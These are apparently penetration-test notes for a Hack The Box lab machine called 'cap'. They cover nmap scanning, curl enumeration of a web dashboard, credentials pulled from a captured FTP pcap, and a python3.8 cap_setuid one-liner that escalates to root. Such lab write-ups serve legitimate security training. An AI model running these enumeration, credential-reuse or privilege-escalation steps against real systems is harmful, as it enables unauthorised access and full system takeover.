# Cap Scans

## Target
- Machine: `cap`
- IP: `10.129.15.193`

## Initial Nmap
- Date: `2026-03-23`
- Command: `nmap -Pn -sC -sV -oA /home/cho/htb/cap/scans/initial 10.129.15.193`

### Results
- `21/tcp` open: `ftp` (`vsftpd 3.0.3`)
- `22/tcp` open: `ssh` (`OpenSSH 8.2p1 Ubuntu 4ubuntu0.2`)
- `80/tcp` open: `http` (`Gunicorn`)
- HTTP title: `Security Dashboard`

### Notes
- Host responded with low latency and showed 997 closed TCP ports.
- The exposed web application on port 80 is the most likely initial entry point.
- FTP and SSH should be evaluated after the web application is understood, especially for credential reuse or disclosed files.

## Web Enumeration
- Date: `2026-03-23`
- `curl -i http://10.129.15.193/`
  - Confirmed routes: `/capture`, `/ip`, `/netstat`
  - UI displays username `Nathan`
- `curl -i http://10.129.15.193/capture`
  - Returned `302 FOUND`
  - Redirect target: `/data/1`
- `for i in $(seq 0 10); do curl -s -o /dev/null -w "%{http_code} %{size_download} /data/$i\n" http://10.129.15.193/data/$i; done`
  - `/data/0` -> `200`
  - `/data/1` -> `200`
  - `/data/2` through `/data/10` -> `302`

## Artifact Review
- Saved `/download/0` to `cap/artifacts/0.pcap`
- `strings -n 4 cap/artifacts/0.pcap` exposed a cleartext FTP session
- Recovered credentials:
  - `nathan:Buck3tH4TF0RM3!`

## Post-Exploitation
- SSH login confirmed for `nathan` with the recovered password
- `id`
  - `uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)`
- `getcap -r / 2>/dev/null`
  - `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`
- Privilege escalation command:
  - `python3.8 -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'`
- Result:
  - `uid=0(root) gid=1001(nathan) groups=1001(nathan)`
